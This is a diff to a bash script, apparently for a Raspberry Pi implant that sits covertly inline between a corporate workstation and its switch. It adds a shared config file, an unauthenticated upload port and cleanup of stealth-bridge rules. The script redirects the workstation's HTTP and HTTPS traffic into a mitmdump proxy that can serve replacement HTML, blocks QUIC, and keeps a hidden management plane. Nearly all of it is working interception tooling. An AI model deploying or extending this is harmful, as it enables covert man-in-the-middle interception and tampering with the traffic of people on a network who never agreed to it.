@@ -48,10 +48,14 @@
 # =============================================================================
 set -euo pipefail
 
+# --- shared identity (optional single source of truth; overrides the CONFIG below) ---
+_SHARED_CONF="${PI_MODE_CONF:-/etc/pi-mode/pi-mode.conf}"
+[[ -r "$_SHARED_CONF" ]] && . "$_SHARED_CONF" || true
+
 ### ---- CONFIG ---------------------------------------------------------------
 BR="br0"
-WS_IFACE="eth0"           # faces the WORKSTATION / target (bridged member)
-UP_IFACE="usb0"           # faces the CORPORATE SWITCH / uplink (bridged member)
+WS_IFACE="${WIRED_IFACE:-eth0}"           # faces the WORKSTATION / target (bridged member)
+UP_IFACE="${SECOND_IFACE:-usb0}"           # faces the CORPORATE SWITCH / uplink (bridged member)
 
 # br0 needs a REAL corporate address (the proxy makes its own outbound calls).
 BR_DHCP="1"               # 1 = br0 pulls a corporate lease via UP_IFACE (dhclient)
@@ -63,15 +67,16 @@ BR_DNS="1.1.1.1"          # resolver for the Pi in static mode (space-separated)
 # --- management plane (NOT bridged) — your ops laptop --------------------------
 KEEP_AP="1"               # leave wlan0 hostapd/dnsmasq (AP) up as mgmt + drop plane
 ENABLE_MGMT="1"           # dedicated management CABLE on its own NIC (ethernet to laptop)
-MGMT_IFACE="eth2"         # the mgmt NIC — MUST differ from WS_IFACE/UP_IFACE, not bridged
-MGMT_IP="10.73.0.1"       # pick a subnet that will NOT overlap the corporate net
-MGMT_PREFIX="24"
+MGMT_IFACE="${MGMT_IFACE:-eth2}"         # the mgmt NIC — MUST differ from WS_IFACE/UP_IFACE, not bridged
+MGMT_IP="${MGMT_IP:-10.73.0.1}"       # pick a subnet that will NOT overlap the corporate net
+MGMT_PREFIX="${MGMT_PREFIX:-24}"
 MGMT_DHCP="1"             # hand the ops laptop an address via a dedicated dnsmasq
 MGMT_DHCP_START="10.73.0.50"
 MGMT_DHCP_END="10.73.0.150"
 
 # --- intercept / proxy --------------------------------------------------------
 PROXY_PORT="8080"
+UPLOAD_PORT="${UPLOAD_PORT:-80}"         # updrop port, fenced off the corporate br0 IP
 PROXY_USER="mitm"         # unprivileged user mitmdump runs as (created if missing)
 WORKDIR="/opt/inline-proxy"   # addon, replacement HTML, mitmproxy home (CA) live here
 INTERCEPT_HTTP="1"        # redirect workstation TCP/80 into the proxy
@@ -181,6 +186,7 @@ fw_specs(){   # emit "table|rule" lines for the current config
   [[ "$INTERCEPT_HTTP" == "1" ]] && echo "nat|PREROUTING -m physdev --physdev-in ${WS_IFACE} -p tcp --dport 80 -j REDIRECT --to-ports ${PROXY_PORT}"
   [[ "$INTERCEPT_HTTPS" == "1" ]] && echo "nat|PREROUTING -m physdev --physdev-in ${WS_IFACE} -p tcp --dport 443 -j REDIRECT --to-ports ${PROXY_PORT}"
   echo "filter|INPUT -i ${BR} -p tcp --dport ${PROXY_PORT} -j ACCEPT"
+  echo "filter|INPUT -i ${BR} -p tcp --dport ${UPLOAD_PORT} -j DROP"   # fence no-auth updrop off the corp side
   echo "filter|FORWARD -i ${BR} -o ${BR} -j ACCEPT"
   [[ "$BLOCK_QUIC" == "1" ]] && echo "filter|FORWARD -m physdev --physdev-in ${WS_IFACE} -p udp --dport 443 -j DROP"
 }
@@ -247,6 +253,12 @@ mgmt_down(){ [[ "$ENABLE_MGMT" == "1" ]] || return 0
 intercept_up(){
   need_root; preflight_guard; ensure_tools
   unmanage_nm; stop_eth_ap_on_member; strip_member_l3
+  # defensive: clear stealth-bridge residue (ebtables DROP / UPDROP_BRIN) from a prior
+  # 'pi_bridge_setup.sh up' that was not 'down'ed — it would silently break intercept.
+  if have ebtables; then ebtables -t filter -F 2>/dev/null || true; for c in INPUT OUTPUT FORWARD; do ebtables -t filter -P "$c" ACCEPT 2>/dev/null || true; done; fi
+  iptables -D INPUT -i "$BR" -j UPDROP_BRIN 2>/dev/null || true
+  iptables -F UPDROP_BRIN 2>/dev/null || true
+  iptables -X UPDROP_BRIN 2>/dev/null || true
 
   echo "[*] building bridge ${BR} (${WS_IFACE}=workstation, ${UP_IFACE}=corp switch)..."
   ip link set "$WS_IFACE" down 2>/dev/null || true
@@ -287,6 +299,7 @@ intercept_down(){
   fw_clear
   pkill -u "$PROXY_USER" -f mitmdump 2>/dev/null || true
   sysctl -qw net.bridge.bridge-nf-call-iptables=0 2>/dev/null || true
+  sysctl -qw net.ipv4.ip_forward=0 2>/dev/null || true
   ip link set "$WS_IFACE" nomaster 2>/dev/null || true
   ip link set "$UP_IFACE" nomaster 2>/dev/null || true
   ip link del "$BR" 2>/dev/null || true
